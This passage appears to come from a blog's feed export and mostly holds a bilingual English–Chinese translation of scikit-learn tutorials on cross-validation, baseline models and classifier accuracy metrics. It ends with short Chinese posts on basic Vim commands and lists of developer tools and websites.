datasets.load_digits()</span><br><span class="line"><span class="comment"># Create features matrix</span></span><br><span class="line">features = digits.data</span><br><span class="line"><span class="comment"># Create target vector</span></span><br><span class="line">target = digits.target</span><br><span class="line"><span class="comment"># Create standardizer</span></span><br><span class="line">standardizer = StandardScaler()</span><br><span class="line"><span class="comment"># Create logistic regression object</span></span><br><span class="line">logit = LogisticRegression()</span><br><span class="line"><span class="comment"># Create a pipeline that standardizes, then runs logistic regression</span></span><br><span class="line">pipeline = make_pipeline(standardizer, logit)</span><br><span class="line"><span class="comment"># Create k-Fold cross-validation</span></span><br><span class="line">kf = KFold(n_splits=<span class="number">10</span>, shuffle=<span class="keyword">True</span>, random_state=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># Conduct k-fold cross-validation</span></span><br><span class="line">cv_results = cross_val_score(pipeline, <span class="comment"># Pipeline</span></span><br><span class="line"> features, <span class="comment"># Feature matrix</span></span><br><span class="line"> target, <span class="comment"># Target vector</span></span><br><span class="line"> cv=kf, <span class="comment"># Cross-validation technique</span></span><br><span class="line"> scoring=<span class="string">"accuracy"</span>, <span class="comment"># Loss function</span></span><br><span class="line"> n_jobs=<span class="number">-1</span>) <span class="comment"># Use all CPU scores</span></span><br><span class="line"><span class="comment"># Calculate mean</span></span><br><span class="line">cv_results.mean()</span><br><span class="line"><span class="number">0.96493171942892597</span></span><br></pre></td></tr></table></figure><h3 id="Discussion"><a href="#Discussion" class="headerlink" title="Discussion"></a>Discussion</h3><h3 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h3><p>At first consideration, evaluating supervised-learning models might appear straight‐<br>forward: train a model and then calculate how well it did using some performance<br>metric (accuracy, squared errors, etc.). However, this approach is fundamentally<br>flawed. If we train a model using our data, and then evaluate how well it did on that<br>data, we are not achieving our desired goal. Our goal is not to evaluate how well the<br>model does on our training data, but how well it does on data it has never seen before<br>(e.g., a new customer, a new crime, a new image). For this reason, our method of<br>evaluation should help us understand how well models are able to make predictions<br>from data they have never seen before.</p><p>首先要考虑一点，评估监督学习模型可能表现的很直接：训练一个模型然后通过使用一些性能指标来计算它的表现（准确性、均方误差，等等）。然而这种方式有一个基本的缺陷。如果我们用我们的数据去训练一个模型，然后用同样的数据评估它的表现，这样达不到我们的验证目标。我们的目标不是在我们的训练数据上评估模型，而应该是用它从来没见过的数据来评估（比如，一个新的消费者、一次新的犯罪或者一张新的图片）。由于这些原因，我们的评估方法应该帮助我们去理解这些模型是否足够好的从未知数据中去做出预测。</p><p>One strategy might be to hold off a slice of data for testing. This is called validation<br>(or hold-out). In validation our observations (features and targets) are split into two<br>sets, traditionally called the training set and the test set. We take the test set and put it<br>off to the side, pretending that we have never seen it before. Next we train our model<br>using our training set, using the features and target vector to teach the model how to make the best prediction. Finally, we simulate having never before seen external data<br>by evaluating how our model trained on our training set performs on our test set.<br>However, the validation approach has two major weaknesses. First, the performance<br>of the model can be highly dependent on which few observations were selected for<br>the test set. Second, the model is not being trained using all the available data, and<br>not being evaluated on all the available data.</p><p>其中一种策略可以是保留一部分数据用来测试模型。这种方法被称作校验（或者叫留出法）。在实际验证中，我们把我们的采样数据（特征或者目标）分割成两部分，传统上我们叫它们训练集和测试集。我们取出测试集然后放到一边，假装我们从来没遇到过这些数据。下一步我们可以使用训练集来训练我们的模型，使用特征和目标向量来教会模型如何做出最好的预测。最终我们使用测试集来模拟从来没有遇到过的外部数据，来评估我们的模型训练结果。然而这种校验方法有两个主要的缺陷。首先，模型的性能高度依赖我们选出来作为测试集的采样数据。其次，模型没有被所有数据有效的训练，也没有被所有的有效数据校验。</p><p>A better strategy, which overcomes these weaknesses, is called k-fold cross-validation<br>(KFCV). In KFCV, we split the data into k parts called “folds.” The model is then<br>trained using k – 1 folds—combined into one training set—and then the last fold is<br>used as a test set. We repeat this k times, each time using a different fold as the test<br>set. The performance on the model for each of the k iterations is then averaged to<br>produce an overall measurement.<br>In our solution, we conducted k-fold cross-validation using 10 folds and outputted<br>the evaluation scores to cv_results: </p><p>一个更好的策略，被称作 k-fold 交叉验证（KFCV）的方法能够克服这些缺点。在KFCV中，我们分割这些数据为k组，我们叫它为”叠”。然后使用k-1叠数据来训练模型，然后用最后一叠做数据校验。我们通过重复K次，使得每一次都可以使用不同的叠作为测试数据来校验模型。我们取每一次模型被训练的结果来进行平均处理，然后得到一个整体的衡量结果。</p><p>在我们的方案中，应用KFCV思想，我们通过分割出10叠数据然后输出评估得分到变量 cv_results 中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># View score for all 10 folds</span></span><br><span class="line">cv_results</span><br><span class="line">array([ <span class="number">0.97222222</span>, <span class="number">0.97777778</span>, <span class="number">0.95555556</span>, <span class="number">0.95</span> , <span class="number">0.95555556</span>,</span><br><span class="line"> <span class="number">0.98333333</span>, <span class="number">0.97777778</span>, <span class="number">0.96648045</span>, <span class="number">0.96089385</span>, <span class="number">0.94972067</span>])</span><br></pre></td></tr></table></figure><p>There are three important points to consider when we are using KFCV. First, KFCV<br>assumes that each observation was created independent from the other (i.e., the data<br>is independent identically distributed [IID]). If the data is IID, it is a good idea to<br>shuffle observations when assigning to folds. In scikit-learn we can set shuffle=True<br>to perform shuffling.</p><p>当我们使用KFCV思想来训练模型时，这里有三个重要的关键点。首先KFCV假定每个采样数据是独立于其它采样创建的（例如，数据是独立同分布的[IID]）.<br>如果数据是满足IID原则，那么拆分数据叠的时候，打乱叠的顺序会是一个好主意。在 scikit-learn 中，，我们可以设置变量shuffle为true来进行打乱操作。</p><p>Second, when we are using KFCV to evaluate a classifier, it is often beneficial to have<br>folds containing roughly the same percentage of observations from each of the differ‐<br>ent target classes (called stratied k-fold). For example, if our target vector contained<br>gender and 80% of the observations were male, then each fold would contain 80%<br>male and 20% female observations. In scikit-learn, we can conduct stratified k-fold<br>cross-validation by replacing the KFold class with StratifiedKFold.<br>Finally, when we are using validation sets or cross-validation, it is important to pre‐<br>process data based on the training set and then apply those transformations to both<br>the training and test set. For example, when we fit our standardization object, stand<br>ardizer, we calculate the mean and variance of only the training set. Then we apply<br>that transformation (using transform) to both the training and test sets:</p><p>其次，当我们使用 KFCV 来评估一个分类器时，它的优势在于粗略的对采样数据按照不同目标类以相同比例来划分 “叠”（被称作分层 k-fold）。举个例子，如果我们目标矢量包含了性别并且80%的采样数据是男性，那么每个”叠”应该包含80%男性和20%的女性采样数据。<br>在 scikit-learn 框架中，我们能通过使用 StratifiedKFold 类替换 KFold，即可实现分层 k-fold 交叉验证。最终当我们使用验证数据集或者交叉验证，最重要的是根据训练集去预处理数据，然后应用这些同样的处理方式到训练集和测试集。举例来说，当我们用 fit 操作我们的 standardization 对象和 standardizer 时，我们仅对训练集来计算平方差和方差。然后我们应用这些变换（使用transform 方法）对训练集和测试集都进行处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Import library</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="comment"># Create training and test sets</span></span><br><span class="line">features_train, features_test, target_train, target_test = train_test_split(</span><br><span class="line"> features, target, test_size=<span class="number">0.1</span>, random_state=<span class="number">1</span>)</span><br><span class="line"><span class="number">11.1</span> Cross-Validating Models | <span class="number">181</span></span><br><span class="line"><span class="comment"># Fit standardizer to training set</span></span><br><span class="line">standardizer.fit(features_train)</span><br><span class="line"><span class="comment"># Apply to both training and test sets</span></span><br><span class="line">features_train_std = standardizer.transform(features_train)</span><br><span class="line">features_test_std = standardizer.transform(features_test)</span><br></pre></td></tr></table></figure><p>The reason for this is because we are pretending that the test set is unknown data. If<br>we fit both our preprocessors using observations from both training and test sets,<br>some of the information from the test set leaks into our training set. This rule applies<br>for any preprocessing step such as feature selection.<br>scikit-learn’s pipeline package makes this easy to do while using cross-validation tech‐<br>niques. We first create a pipeline that preprocesses the data (e.g., standardizer) and<br>then trains a model (logistic regression, logit):</p><p>这么做的原因是我们假装测试数据是未知的。如果我们使用来自训练集和测试集的采样数据对我们的预处理器 fit 操作，那么一些信息就会从测试集泄露进训练集。这个规则应用于任何预处理流程，例如特性选择。当使用交叉验证技术时，scikit-learn 的 pipeline 包让这些变得非常简单。我们首先创建一个流水线去预处理这些数据（例如，standardizer） 然后训练这些我们的模型（逻辑回归，logit算法）:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Create a pipeline</span></span><br><span class="line">pipeline = make_pipeline(standardizer, logit)</span><br><span class="line">Then we run KFCV using that pipeline <span class="keyword">and</span> scikit does all the work <span class="keyword">for</span> us:</span><br><span class="line"><span class="comment"># Do k-fold cross-validation</span></span><br><span class="line">cv_results = cross_val_score(pipeline, <span class="comment"># Pipeline</span></span><br><span class="line"> features, <span class="comment"># Feature matrix</span></span><br><span class="line"> target, <span class="comment"># Target vector</span></span><br><span class="line"> cv=kf, <span class="comment"># Cross-validation technique</span></span><br><span class="line"> scoring=<span class="string">"accuracy"</span>, <span class="comment"># Loss function</span></span><br></pre></td></tr></table></figure><p>cross_val_score comes with three parameters that we have not discussed that are<br>worth noting. cv determines our cross-validation technique. K-fold is the most com‐<br>mon by far, but there are others, like leave-one-out-cross-validation where the num‐<br>ber of folds k equals the number of observations. The scoring parameter defines our<br>metric for success, a number of which are discussed in other recipes in this chapter.<br>Finally, n_jobs=-1 tells scikit-learn to use every core available. For example, if your<br>computer has four cores (a common number for laptops), then scikit-learn will use<br>all four cores at once to speed up the operation.</p><p>cross_val_score 方法需要三个参数，我们没有讨论但是这里值得一提，cv 决定我们的交叉验证技术。K-fold 是目前最通用的技术，但是还是有一些其他技术可以选择，比如创建和采样数据个数相同”叠”的 leave-one-out-cross-validation 。scoring 参数定义了我们对成功的衡量标准，我们将会在本章中其他小节大量讨论。最后，n_jobs=-1 是告诉 scikit-learn 去使用每一个可用的CPU核心。举例来说，如果你的计算机有四个核心（笔记本通常的配置），然后 scikit-learn 将使用四个全部核心来加速运行。</p><h3 id="See-Also"><a href="#See-Also" class="headerlink" title="See Also"></a>See Also</h3><ul><li>Why every statistician should know about cross-validation (<a href="http://bit.ly/2Fzhz6X" target="_blank" rel="noopener">http://bit.ly/2Fzhz6X</a>)</li><li>Cross-Validation Gone Wrong (<a href="http://bit.ly/2FzfIiw" target="_blank" rel="noopener">http://bit.ly/2FzfIiw</a>)</li></ul><h3 id="查看更多"><a href="#查看更多" class="headerlink" title="查看更多"></a>查看更多</h3><ul><li>为什么数据科学家都应该知道交叉验证 (<a href="http://bit.ly/2Fzhz6X" target="_blank" rel="noopener">http://bit.ly/2Fzhz6X</a>)</li><li>交叉验证走在错误的道路上 (<a href="http://bit.ly/2FzfIiw" target="_blank" rel="noopener">http://bit.ly/2FzfIiw</a>)</li></ul><h2 id="11-2-Creating-a-Baseline-Regression-Model"><a href="#11-2-Creating-a-Baseline-Regression-Model" class="headerlink" title="11.2 Creating a Baseline Regression Model"></a>11.2 Creating a Baseline Regression Model</h2><h2 id="11-2-创建一个基线回归模型"><a href="#11-2-创建一个基线回归模型" class="headerlink" title="11.2 创建一个基线回归模型"></a>11.2 创建一个基线回归模型</h2><h3 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h3><p>You want a simple baseline regression model to compare against your model</p><p>你需要创建一个基线回归模型来和你的模型对比</p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>Use scikit-learn’s DummyRegressor to create a simple model to use as a baseline</p><p>使用 scikit-learn 的 DummyRegressor 来创建一个简单模型作为基准对比使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load libraries</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_boston</span><br><span class="line"><span class="keyword">from</span> sklearn.dummy <span class="keyword">import</span> DummyRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="comment"># Load data</span></span><br><span class="line">boston = load_boston()</span><br><span class="line"><span class="comment"># Create features</span></span><br><span class="line">features, target = boston.data, boston.target</span><br><span class="line"><span class="comment"># Make test and training split</span></span><br><span class="line">features_train, features_test, target_train, target_test = train_test_split(</span><br><span class="line"> features, target, random_state=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># Create a dummy regressor</span></span><br><span class="line">dummy = DummyRegressor(strategy=<span class="string">'mean'</span>)</span><br><span class="line"><span class="comment"># "Train" dummy regressor</span></span><br><span class="line">dummy.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Get R-squared score</span></span><br><span class="line">dummy.score(features_test, target_test)</span><br><span class="line"><span class="number">-0.0011193592039553391</span></span><br></pre></td></tr></table></figure><p>To compare, we train our model and evaluate the performance score:<br>来对比，我们训练我们的模型然后进行性能评分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Load library</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="comment"># Train simple linear regression model</span></span><br><span class="line">ols = LinearRegression()</span><br><span class="line">ols.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Get R-squared score</span></span><br><span class="line">ols.score(features_test, target_test)</span><br><span class="line"><span class="number">0.63536207866746675</span></span><br></pre></td></tr></table></figure><h3 id="Discussion-1"><a href="#Discussion-1" class="headerlink" title="Discussion"></a>Discussion</h3><h3 id="讨论-1"><a href="#讨论-1" class="headerlink" title="讨论"></a>讨论</h3><p>DummyRegressor allows us to create a very simple model that we can use as a baseline<br>to compare against our actual model. This can often be useful to simulate a “naive”<br>existing prediction process in a product or system. For example, a product might<br>have been originally hardcoded to assume that all new users will spend $100 in the<br>first month, regardless of their features. If we encode that assumption into a baseline<br>model, we are able to concretely state the benefits of using a machine learning<br>approach.</p><p>DummyRegressor 允许我们的创建一个非常简单的模型，用来作为基线参考，从而可以和我们的真实模型作为对比。在一个系统或者产品中，它是非常有用的去模拟一个原始存在的预测处理机制。举例来说，一个软件产品可能通过传统的方式被硬编码的方式编写了一些程序逻辑，根据用户特性，假定所有的用户将要在第一个月花费100美元。如果我们编写这个假设进入一个基线模型，我们能实实在在的看到机器学习技术被加入到软件中的优势。</p><p>DummyRegressor uses the strategy parameter to set the method of making predic‐<br>tions, including the mean or median value in the training set. Furthermore, if we set<br>strategy to constant and use the constant parameter, we can set the dummy<br>regressor to predict some constant value for every observation:</p><p>DummyRegressor 使用 strategy 参数去设置做出预测的方法，包括在返回一个测试集中的均值或中值。此外，如果我们设置strategy参数为constant 并且使用 constant 参数，DummyRegressor 会固定返回传给 constant 参数的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Create dummy regressor that predicts 20's for everything</span></span><br><span class="line">clf = DummyRegressor(strategy=<span class="string">'constant'</span>, constant=<span class="number">20</span>)</span><br><span class="line">clf.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Evaluate score</span></span><br><span class="line">clf.score(features_test, target_test)</span><br><span class="line"><span class="number">-0.065105020293257265</span></span><br></pre></td></tr></table></figure><p>One small note regarding score. By default, score returns the coefficient of determi‐<br>nation (R-squared, R) score:</p><p>where yi is the true value of the target observation, yi is the predicted value, and ȳ is the mean value for the target vector. The closer R 2<br>is to 1, the more of the variance in the target vector that is explained by the features.</p><p>顺带提一下性能得分的计算方法，默认情况下，返回的分值为测定结果（R-squared, <code>$R^2$</code>）得分的系数：</p><p>这里的 <code>$y_i$</code> 是目标采样数据为真的值，<code>$\hat{y_i}$</code> 为预测值， <code>$\overline{y}$</code> 为目标向量的平均值。</p><p><code>$R^2$</code> 越是趋近于1，说明在目标矢量中越多的变化越能被特征解释。</p><p><code>$R^2 =  1-  \frac{ \sum(y_i-\hat{y_i}) }{\sum(y_i-\overline{y_i}) } $</code></p><h2 id="11-3-Creating-a-Baseline-Classification-Model"><a href="#11-3-Creating-a-Baseline-Classification-Model" class="headerlink" title="11.3 Creating a Baseline Classification Model"></a>11.3 Creating a Baseline Classification Model</h2><h3 id="Problem-2"><a href="#Problem-2" class="headerlink" title="Problem"></a>Problem</h3><p>You want a simple baseline classifier to compare against your model.</p><p>你需要一个简单的基线分类器去对比你的模型</p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>Use scikit-learn’s DummyClassifier:</p><p>使用 scikit-learn 的 DummyClassifier</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Load libraries</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris</span><br><span class="line"><span class="keyword">from</span> sklearn.dummy <span class="keyword">import</span> DummyClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="comment"># Load data</span></span><br><span class="line">iris = load_iris()</span><br><span class="line"><span class="comment"># Create target vector and feature matrix</span></span><br><span class="line">features, target = iris.data, iris.target</span><br><span class="line"><span class="comment"># Split into training and test set</span></span><br><span class="line">features_train, features_test, target_train, target_test = train_test_split(</span><br><span class="line">features, target, random_state=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># Create dummy classifier</span></span><br><span class="line">dummy = DummyClassifier(strategy=<span class="string">'uniform'</span>, random_state=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># "Train" model</span></span><br><span class="line">dummy.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Get accuracy score</span></span><br><span class="line">dummy.score(features_test, target_test)</span><br><span class="line"><span class="number">0.42105263157894735</span></span><br></pre></td></tr></table></figure><p>By comparing the baseline classifier to our trained classifier, we can see the improvement:</p><p>通过把训练后的分类器和基线分类器进行对比，我们能看到这些提升:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load library</span></span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="comment"># Create classifier</span></span><br><span class="line">classifier = RandomForestClassifier()</span><br><span class="line"><span class="comment"># Train model</span></span><br><span class="line">classifier.fit(features_train, target_train)</span><br><span class="line"><span class="comment"># Get accuracy score</span></span><br><span class="line">classifier.score(features_test, target_test)</span><br><span class="line"><span class="number">0.94736842105263153</span></span><br></pre></td></tr></table></figure><h3 id="Discussion-2"><a href="#Discussion-2" class="headerlink" title="Discussion"></a>Discussion</h3><p>A common measure of a classifier’s performance is how much better it is than ran‐<br>dom guessing. scikit-learn’s DummyClassifier makes this comparison easy. The strat<br>egy parameter gives us a number of options for generating values. There are two par‐<br>ticularly useful strategies. First, stratified makes predictions that are proportional<br>to the training set’s target vector’s class proportions (i.e., if 20% of the observations in<br>the training data are women, then DummyClassifier will predict women 20% of the time).<br> Second, uniform will generate predictions uniformly at random between the<br>different classes. For example, if 20% of observations are women and 80% are men,<br>uniform will produce predictions that are 50% women and 50% men.</p><p>一个通常的做法去衡量分类器工作的有多好的方式是把它的结果和随机猜测对比。scikit-learn 的DummyClassifier让这项比较变得简单。</p><p>strategy 参数为我们生成值提供了大量选项。这里有两个特别有用的策略。 首先是 stratified 使做出的虚拟预测让目标矢量属性在训练集中成比例分布（例如，如果训练集中，20%的采样数据是女性，DummyClassifier 将当次预测出20%为女性。其次是 uniform，这种方式将生成预测均匀的在不同类中随机生成。举例来说，如果观察对象包含了20%的女性和80%的男性，uniform 将生成预测结果为50%的女性和50%的男性。</p><h3 id="See-Also-1"><a href="#See-Also-1" class="headerlink" title="See Also"></a>See Also</h3><h3 id="查看更多-1"><a href="#查看更多-1" class="headerlink" title="查看更多"></a>查看更多</h3><ul><li>scikit-learn documentation: DummyClassifier (<a href="http://bit.ly/2Fr178G" target="_blank" rel="noopener">http://bit.ly/2Fr178G</a>)</li><li>scikit-learn 文档：DummyClassifier (<a href="http://bit.ly/2Fr178G" target="_blank" rel="noopener">http://bit.ly/2Fr178G</a>)</li></ul><h2 id="11-4-Evaluating-Binary-Classifier-Predictions"><a href="#11-4-Evaluating-Binary-Classifier-Predictions" class="headerlink" title="11.4 Evaluating Binary Classifier Predictions"></a>11.4 Evaluating Binary Classifier Predictions</h2><h2 id="11-4-评估二元分类器预测"><a href="#11-4-评估二元分类器预测" class="headerlink" title="11.4 评估二元分类器预测"></a>11.4 评估二元分类器预测</h2><h3 id="Problem-3"><a href="#Problem-3" class="headerlink" title="Problem"></a>Problem</h3><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><p>Given a trained classification model, you want to evaluate its quality.</p><p>给定一个训练后的分类器模型，你需要评估它的质量</p><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>Use scikit-learn’s cross_val_score to conduct cross-validation while using the scor<br>ing parameter to define one of a number of performance metrics, including accuracy,<br>, recall, and F1.<br>Accuracy is a common performance metric. It is simply the proportion of observa‐<br>tions predicted correctly:</p><p>当使用 scoring 参数来定义大量性能指标中的一个时，使用 scikit-learn 的 cross_val_score 去实现交叉验证，包括准确率，精确率，召回率，F值。<br>准确率是一个常用性能指标。它是简单的计算正确预测的采样数据比值。</p><p><code>$ Accuracy = \frac{TP + TN}{TP + TN + FP + FN} $</code></p><p>where:</p><ul><li>TP is the number of true positives. Observations that are part of the positive class<br>(has the disease, purchased the product, etc.) and that we predicted correctly.</li><li>TN is the number of true negatives. Observations that are part of the negative<br>class (does not have the disease, did not purchase the product, etc.) and that we<br>predicted correctly.</li><li>FP is the number of false positives. Also called a Type I error. Observations pre‐<br>dicted to be part of the positive class that are actually part of the negative class.</li><li>FN is the number of false negatives. Also called a Type II error. Observations pre‐<br>dicted to be part of the negative class that are actually part of the positive class.</li></ul><p>这里：</p><ul><li>TP是真阳性的采样数量，采样中具有正向类型的（患有疾病，购买了产品等等）并且我们的预测正确。</li><li>TN是真阴性的采样数量，采样中具有负向类型的（没有患有疾病，没有购买产品等等）并且我们预测正确。</li><li>FP是假阳性的采样数量，又被成为I型错误。采样中被预测为正向分类但是实际上为负向分类的。</li><li>FN是假阴性的采样数量，又被称为II型错误，采样中被预测为负向类型，但实际上为正向分类的。</li></ul><p>We can measure accuracy in three-fold (the default number of folds) cross-validation<br>by setting scoring=”accuracy”:</p><p>我们能通过设置scoring参数为accuracy来衡量accuracy在三个”叠”（默认数量）的交叉验证：</p>]]></content>
      
      
      <categories>
          
          <category> translation </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>必须学会的VIM命令</title>
      <link href="/tool/tool-collections/vim/"/>
      <url>/tool/tool-collections/vim/</url>
      
        <content type="html"><![CDATA[<p>VIM中有大量命令其实用不到，并且可以用更为简单的方式实现，例如打开文件的各种参数、重命名文件可以用Linux命令代替，因此为了便于记忆，这里罗列了最基本但能实现几乎所有功能的命令。</p><h2 id="Vim的几种模式"><a href="#Vim的几种模式" class="headerlink" title="Vim的几种模式"></a>Vim的几种模式</h2><p>正常模式：可以使用快捷键命令，或按:输入命令行。<br>插入模式：可以输入文本，在正常模式下，按i、a、o等都可以进入插入模式。<br>可视模式：正常模式下按v可以进入可视模式， 在可视模式下，移动光标可以选择文本。按V进入可视行模式， 总是整行整行的选中。ctrl+v进入可视块模式。<br>替换模式：正常模式下，按R进入。</p><h2 id="打开"><a href="#打开" class="headerlink" title="打开"></a>打开</h2><blockquote><p>vim filename</p></blockquote><h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><p>ESC 退出到正常模式</p><blockquote><p>:wq</p></blockquote><h2 id="强制退出"><a href="#强制退出" class="headerlink" title="强制退出"></a>强制退出</h2><blockquote><p>:q!</p></blockquote><h2 id="移动方向为控制模式"><a href="#移动方向为控制模式" class="headerlink" title="移动方向为控制模式"></a>移动方向为控制模式</h2><p> K<br>H L<br> J</p><p>0 移动到行首<br>$ 移动到行位，类似正则表达式<br>gg 文件头部<br>G 文件底部</p><p>L 移动到当前屏幕的第一行</p><p>标记不好用，略过</p><p>翻页推荐使用半屏，命令也好记，up&amp;down<br>ctrl+d: 下翻半屏。<br>ctrl+u: 上翻半屏。</p><p>当前光标插入</p><p>a</p><p>新建一行插入<br>o</p><h2 id="复制和粘贴"><a href="#复制和粘贴" class="headerlink" title="复制和粘贴"></a>复制和粘贴</h2><p>[n] dd: 删除（剪切）1(n)行,这个特别好用</p><p>p 在光标之后粘贴<br>y 复制选中字符</p><p>查找和替换</p><p>/something: 在后面的文本中查找something。<br>?something: 在前面的文本中查找something。</p><p>:s/old/new - 用new替换当前行第一个old。<br>:s/old/new/g - 用new替换当前行所有的old。</p><p> 改变大小写<br>~: 反转光标所在字符的大小写。<br>可视模式下的U或u：把选中的文本变为大写或小写。</p><p>另外推荐教程：<br><a href="http://vimcasts.org/" target="_blank" rel="noopener">http://vimcasts.org/</a><br><a href="https://coolshell.cn/articles/5426.html" target="_blank" rel="noopener">https://coolshell.cn/articles/5426.html</a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开发工具图谱</title>
      <link href="/development/tool-collections/development%20tool/"/>
      <url>/development/tool-collections/development%20tool/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><ul><li><p>编辑器</p><ul><li>VIM </li><li>Sublime </li></ul></li><li><p>VCS </p><ul><li>SVN </li><li>GIT</li></ul></li><li><p>IDE</p><ul><li>IntelliJ IDEA</li></ul></li><li><p>抓包工具</p><ul><li>Httpwatch</li><li>Wireshark</li><li>fiddler</li></ul></li><li><p>性能分析工具</p><ul><li>AB测试</li><li>网页性能分析</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> development </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>超实用的工具和网站收集</title>
      <link href="/collection/tool-collections/"/>
      <url>/collection/tool-collections/</url>
      
        <content type="html"><![CDATA[<h2 id="流程图、思维导图"><a href="#流程图、思维导图" class="headerlink" title="流程图、思维导图"></a>流程图、思维导图</h2><p><a href="https://www.processon.com" target="_blank" rel="noopener">https://www.processon.com</a></p><p>可以绘制思维导图、流程图、ER图等</p><p><a href="https://coggle.it/" target="_blank" rel="noopener">https://coggle.it/</a></p><p>超漂亮的思维导图工具</p><p><img src="/collection/tool-collections/coggle.png" alt=""></p><p><a href="http://naotu.baidu.com/" target="_blank" rel="noopener">http://naotu.baidu.com/</a></p><p>百度脑图</p><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><p><a href="https://octodex.github.com/" target="_blank" rel="noopener">https://octodex.github.com/</a></p><p>github章鱼头像</p>]]></content>
      
      
      <categories>
          
          <category> collection </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>语义化版本管理</title>
      <link href="/se/semantic-version/"/>
      <url>/se/semantic-version/</url>
      
